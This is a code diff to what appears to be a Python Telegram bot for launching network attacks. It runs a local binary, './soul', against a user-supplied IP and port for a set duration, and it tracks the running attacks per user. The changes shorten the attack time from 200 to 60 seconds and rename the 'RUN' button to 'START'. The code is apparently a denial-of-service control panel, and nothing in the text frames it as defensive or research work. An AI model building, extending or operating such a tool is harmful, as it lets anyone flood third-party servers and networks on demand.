@@ -19,7 +19,7 @@ if os.path.exists('./soul'):
 def runcommand_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "200"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
@@ -35,7 +35,7 @@ def send_main_buttons(chat_id, action):
         markup.add(KeyboardButton("Lest Go ⚠️"))
         bot.send_message(chat_id, "Main Menu:", reply_markup=markup)
     elif action == 1:
-        markup.add(KeyboardButton("RUN ✅ 🚀"))
+        markup.add(KeyboardButton("START ✅ 🚀"))
         bot.send_message(chat_id, "Target set. Ready to start:", reply_markup=markup)
     elif action == 2:
         markup.add(KeyboardButton("STOP ❌"))
@@ -66,7 +66,7 @@ def process_ip_port(message):
         bot.reply_to(message, "*Wrong format*", parse_mode="Markdown")
         send_main_buttons(message.chat.id, 0)
 
-@bot.message_handler(func=lambda message: message.text == "RUN ✅ 🚀")
+@bot.message_handler(func=lambda message: message.text == "START ✅ 🚀")
 def start(message):
     details = userdetails.get(message.from_user.id)
     if details:
